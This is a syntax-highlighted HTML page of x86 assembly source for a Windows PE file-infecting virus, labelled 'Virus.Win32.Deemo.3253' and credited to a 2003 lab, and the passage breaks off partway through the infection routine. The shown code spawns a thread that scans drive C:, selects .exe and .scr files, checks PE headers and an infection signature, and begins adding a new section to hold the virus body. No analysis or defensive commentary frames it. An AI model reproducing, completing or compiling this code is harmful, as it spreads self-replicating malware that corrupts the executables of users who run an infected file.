<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Deemo.3253 - demo.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Example virus (LDIZX+DEE) DEMO.2</span><span class="sc0">
</span><span class="sc1">; (c) Daniloff Lab's 2003</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (812) 387-6408,388-6424</span><span class="sc0">
</span><span class="sc1">; (095) 137-0150,135-62-53</span><span class="sc0">
</span><span class="sc1">; Call now!</span><span class="sc0">
</span><span class="sc1">;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">import.ash</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">macros.ash</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.ash</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.ash</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">dee</span><span class="sc0">\</span><span class="sc5">dee.ash</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">import32.lib</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc4">=</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">ATOM</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">         </span><span class="sc3">"D3M0"</span><span class="sc0">
</span><span class="sc5">@@x</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">&gt;</span><span class="sc0">


    </span><span class="sc2">.586p</span><span class="sc0">
    </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
    </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">___title</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WIN9X.DEE.Demo.2"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">___msg</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WIN9X.DEE.Demo.2"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" - Atom name is '"</span><span class="sc4">,</span><span class="sc5">ATOM</span><span class="sc4">,</span><span class="sc3">"'"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


    </span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virstart</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MB_OK</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">___title</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">___msg</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같</span><span class="sc0">

</span><span class="sc5">virstart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">                  </span><span class="sc1">; Save flags</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">; &amp; registers</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">              </span><span class="sc1">; Get delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">; Correct return</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
    
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">old_cmd</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Restore old</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">; command</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">atom_name</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">findatom</span><span class="sc0">                           </span><span class="sc1">; Check atom</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">return_to_host</span><span class="sc0">                      </span><span class="sc1">; presence</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">addatom</span><span class="sc0">                </span><span class="sc1">; Add atom</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">atom_id</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infect_delta</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">      </span><span class="sc1">; Save delta</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                                </span><span class="sc1">; ThreadidPtr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; cflags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">; params</span><span class="sc0">
        </span><span class="sc5">pusho</span><span class="sc0"> </span><span class="sc5">just_thread</span><span class="sc0">           </span><span class="sc1">; thread_offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; stack_size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; attributes</span><span class="sc0">
        </span><span class="sc5">kernelCall</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">         </span><span class="sc1">; Create thread</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">return_to_host</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같</span><span class="sc0">

</span><span class="sc5">just_thread</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get delta</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">randomize</span><span class="sc0">                          </span><span class="sc1">; Generate seed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">pushx</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc4">:</span><span class="sc0">\#                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">; Scan drive</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">walk</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">xsize</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">atom_id</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Release atom</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">killatom</span><span class="sc0">               </span><span class="sc1">; </span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; Exit from </span><span class="sc0">
        </span><span class="sc5">kernelCall</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">                   </span><span class="sc1">; thread</span><span class="sc0">

</span><span class="sc1">;께 INFECT 께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;IN:    EDX=fill filename</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;       int 3</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">; EBP = delta</span><span class="sc0">
</span><span class="sc5">infect_delta</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">; Look for</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EXE'</span><span class="sc0">                           </span><span class="sc1">; exes,scrs.</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_exe</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe'</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_exe</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'scr'</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_exe</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'SCR'</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_exit</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
    
</span><span class="sc5">i_exe</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;EDX=name               ; Open file</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fopen</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">i_exit</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; EBX=handle</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fsize</span><span class="sc0">              </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">; ECX = file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">malloc</span><span class="sc0">                             </span><span class="sc1">; Allocate bufer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">; Read file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fread</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_exit_free</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.mz_oeminfo</span><span class="sc4">],</span><span class="sc12">'balD'</span><span class="sc0">   </span><span class="sc1">; Check signature </span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_exit_free</span><span class="sc0">                          </span><span class="sc1">;  (Daniloff Lab)</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edx.mz_peOffset</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EBX = NE header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.pe_sign</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_exit_free</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.pe_NThsize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EAX = OBJ table</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.pe_objcnt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; ESI = hole size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">              </span><span class="sc1">; Check for some space</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">i_exit_free</span><span class="sc0">                          </span><span class="sc1">; between header &amp; </span><span class="sc0">
                                                </span><span class="sc1">; 1st object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께께</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; EAX = null section</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; ECX = last section</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.pe_vAligment</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; ESI=Virtual  alingment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.pe_pAligment</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EDI=Physical alingment</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ecx.pe_Obj_RVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ecx.pe_Obj_vSize</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Virtual end</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.pe_Obj_offset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Physical end</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.pe_Obj_pSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;       int 3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.pe_Obj_RVA</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.pe_Obj_offset</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; Offset</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">virsize</span><span class="sc4">+</span><span class="sc2">1000h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seed</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">; Add to body some</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                                </span><span class="sc1">; random size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">obj_delta</span><span class="sc0"> </span><span class="sc5">@@x</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; EAX = Random </span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;   in-section delta</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; Virtual</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
